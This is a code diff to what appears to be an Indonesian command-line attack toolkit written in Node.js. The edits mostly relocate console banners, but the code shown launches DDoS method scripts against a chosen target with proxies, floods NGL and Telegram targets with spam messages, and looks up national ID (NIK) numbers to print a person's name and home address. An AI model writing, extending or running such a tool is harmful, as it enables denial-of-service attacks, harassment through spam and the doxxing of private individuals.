@@ -8,28 +8,7 @@ const { MailerSend, EmailParams, Sender, Recipient } = require("mailersend");
 const TLZZ = `
 ╭─────❒ 「 ${"root@kukis".red} 」
 └──❒ `
-const PENDINGDDOS =  `
-╭─────❒  DDOS STARTING... 
-│ Target  : ${'${target}'.red}
-│ Methods : ${'${method}'.red}
-| Time    : ${'${time}'.red}
-│ Note    : ${'Jangan lupa jeda biar vps ga meledakkkkk'.magenta}
-└──────────❒`
-const PENDINGNGL = `
-╭─────❒  SPAMNGL STARTING... 
-│ Target  : ${'${target}'.red}
-│ Count   : ${'${count}'.red}
-| Time    : ${'${time}'.red}
-│ Note    : ${'Masukan Teks...'.magenta}
-└──────────❒`
-const PENDINGTELE = `
-╭─────❒  SPAMTELE STARTING... 
-│ Target  : ${'${token}'.red}
-│ ID      : ${'${id}'.red}
-│ Count   : ${'${count}'.red}
-| Time    : ${'${time}'.red}
-│ Note    : ${'Masukan Teks...'.magenta}
-└──────────❒`
+
 const OSINTRESULTS = `
 ╭─────❒  OSINT RESULTS
 │ Target   : ${'${target}'.red}
@@ -37,22 +16,6 @@ const OSINTRESULTS = `
 │ Location : ${'${loc}'.red}
 | Link     : ${'${link}'.red}
 │ Note     : ${'Masukan Teks...'.magenta}
-└──────────❒`
-const NIKRESULTS = `
-╭─────❒  NIK RESULTS
-│ NIK                  : ${'${target}'.red}
-│ Name                 : ${`${d.nama}`.red}
-│ Place/Date of birth  : ERR
-| Gender               : ERR
-│ Address              : ${`${d.namaKabupaten}`.yellow} , ${`${d.namaPropinsi}`.yellow}
-│     └──────────❒ RT/RW : ${`RT ${d.rt} / RW ${d.rw}`.yellow}
-│     └──────────❒ Sub-district/Village : ${`${d.namaKelurahan}`.yellow}
-│     └──────────❒ District         : ${`${d.namaKecamatan}`.yellow}
-│ Religion             : ERR
-│ Marital status       : ERR
-│ Work                 : ERR
-│ Citizenship          : ERR
-│ Valid until          : ${`Lifetime`.red}
 └──────────❒`
 
 const rl = readline.createInterface({
@@ -197,6 +160,14 @@ function osintMenu() {
 
 // --- LOGIC DDOS ---
 function attackExec(target, method, time, rate=100, thread=10, port=80) {
+    const PENDINGDDOS =  `
+╭─────❒  DDOS STARTING... 
+│ Target  : ${'${target}'.red}
+│ Methods : ${'${method}'.red}
+| Time    : ${'${time}'.red}
+│ Note    : ${'Jangan lupa jeda biar vps ga meledakkkkk'.magenta}
+└──────────❒`
+    
     let command = "";
     switch(method) {
         case 'bypass': command = `node assets/Methods/bypass.js ${target} ${time} ${rate} ${thread} proxy.txt`; break;
@@ -207,7 +178,9 @@ function attackExec(target, method, time, rate=100, thread=10, port=80) {
         case 'flood': command = `node assets/Methods/flood.js ${target} ${time}`; break;
         default: console.log("Method Salah, Kontol!".red); handleCmd(); return;
     }
-    console.log(`\n[!] Menyerang ${target} pake ${method}...`.red);
+    console.clear();
+    console.log(ASCII);
+    console.log(PENDINGDDOS);
     exec(command, (err) => { if(err) console.log(`Error: ${err.message}`.red); handleCmd(); });
 }
 
@@ -359,7 +332,24 @@ async function trackNIK(target) {
 
         if (res.status === 'success' && res.data.findceknik) {
             const d = res.data.findceknik;
-            
+            const NIKRESULTS = `
+╭─────❒  NIK RESULTS
+│ NIK                  : ${'${target}'.red}
+│ Name                 : ${`${d.nama}`.red}
+│ Place/Date of birth  : ERR
+| Gender               : ERR
+│ Address              : ${`${d.namaKabupaten}`.yellow} , ${`${d.namaPropinsi}`.yellow}
+│     └──────────❒ RT/RW : ${`RT ${d.rt} / RW ${d.rw}`.yellow}
+│     └──────────❒ Sub-district/Village : ${`${d.namaKelurahan}`.yellow}
+│     └──────────❒ District         : ${`${d.namaKecamatan}`.yellow}
+│ Religion             : ERR
+│ Marital status       : ERR
+│ Work                 : ERR
+│ Citizenship          : ERR
+│ Valid until          : ${`Lifetime`.red}
+└──────────❒`
+            console.clear();
+            console.log(ASCII);
             console.log(NIKRESULTS);
         } else {
             console.log(`[!] NIK TIDAK DITEMUKAN ATAU FORMAT SALAH, GOBLOK!`.red);
@@ -375,6 +365,15 @@ trackNIKReal('3201XXXXXXXXXXXXXXXX');
 
 // --- LOGIC SPAM (DELAY 100ms) ---
 async function spamNGL(target, message, count) {
+    const PENDINGNGL = `
+╭─────❒  SPAMNGL STARTING... 
+│ Target  : ${'${target}'.red}
+│ Count   : ${'${count}'.red}
+| Time    : ${'${time}'.red}
+│ Note    : ${'Masukan Teks...'.magenta}
+└──────────❒`
+    console.clear();
+    console.log(ASCII);
     console.log(PENDINGNGL);
     for (let i = 0; i < count; i++) {
         try {
@@ -387,6 +386,17 @@ async function spamNGL(target, message, count) {
 }
 
 async function spamTele(token, id, message, count) {
+    const PENDINGTELE = `
+╭─────❒  SPAMTELE STARTING... 
+│ Target  : ${'${token}'.red}
+│ ID      : ${'${id}'.red}
+│ Count   : ${'${count}'.red}
+| Time    : ${'${time}'.red}
+│ Note    : ${'Masukan Teks...'.magenta}
+└──────────❒`
+
+    console.clear();
+    console.log(ASCII);
     console.log(PENDINGTELE);
     for (let i = 0; i < count; i++) {
         try {
